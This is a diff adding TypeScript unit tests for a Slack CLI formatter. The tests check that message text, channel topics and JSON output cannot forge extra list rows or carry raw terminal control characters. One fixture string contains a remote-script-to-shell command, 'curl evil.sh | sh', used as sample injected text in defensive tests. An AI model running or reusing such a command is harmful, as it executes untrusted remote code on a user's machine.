@@ -8,10 +8,13 @@ import {
   formatPaginationHint,
   formatFileSize,
   formatMessage,
+  formatChannelList,
   sanitizeForTerminal,
+  sanitizeInline,
   writeJson,
 } from './formatter.ts';
 import type {
+  SlackChannel,
   SavedItem,
   SearchMatch,
   ChannelSearchResult,
@@ -73,6 +76,64 @@ describe('formatMessage sanitization', () => {
     } as SlackMessage;
 
     expect(() => formatMessage(msg, new Map())).not.toThrow();
+  });
+});
+
+describe('sanitizeInline', () => {
+  it('folds newlines and tabs into spaces so a value cannot forge extra rows', () => {
+    expect(sanitizeInline('boring\n  2. @admin in #general\n     RUN: curl evil.sh | sh'))
+      .toBe('boring   2. @admin in #general      RUN: curl evil.sh | sh');
+    expect(sanitizeInline('col1\tcol2')).toBe('col1 col2');
+  });
+
+  it('still strips control characters', () => {
+    expect(sanitizeInline('a\x1b[2Kb')).toBe('a[2Kb');
+  });
+});
+
+describe('list formatters resist row forgery', () => {
+  it('keeps a channel topic on a single line', () => {
+    const channels: SlackChannel[] = [{
+      id: 'C1',
+      name: 'general',
+      topic: { value: 'normal\n  2. #admin-only (C999)' },
+    } as SlackChannel];
+
+    const output = formatChannelList(channels, new Map());
+    const forged = output.split('\n').filter(l => l.includes('#admin-only'));
+    // The text may still appear, but never as its own list row.
+    expect(forged.every(l => l.includes('normal'))).toBe(true);
+  });
+
+  it('keeps a forged message row inside one search result line', () => {
+    const matches: SearchMatch[] = [{
+      ts: '1700000000.000100',
+      text: 'hi\n  2. @admin in #general [01/01/2026 00:00:00]',
+      username: 'mallory',
+    }];
+
+    const output = formatSearchMessages('q', matches, 1);
+    const lines = output.split('\n').map(l => l.trim());
+    // No line consists solely of the forged row.
+    expect(lines).not.toContain('2. @admin in #general [01/01/2026 00:00:00]');
+  });
+});
+
+describe('writeJson control-character escaping', () => {
+  it('escapes DEL and C1 that JSON.stringify leaves raw', () => {
+    const chunks: string[] = [];
+    const originalWrite = process.stdout.write;
+    process.stdout.write = ((chunk: string) => { chunks.push(String(chunk)); return true; }) as typeof process.stdout.write;
+    try {
+      writeJson({ t: 'a\u009b2K\u007fb' });
+    } finally {
+      process.stdout.write = originalWrite;
+    }
+    const out = chunks.join('');
+    expect(out).not.toContain('\u009b');
+    expect(out).not.toContain('\u007f');
+    expect(out).toContain('\\u009b');
+    expect(out).toContain('\\u007f');
   });
 });
 
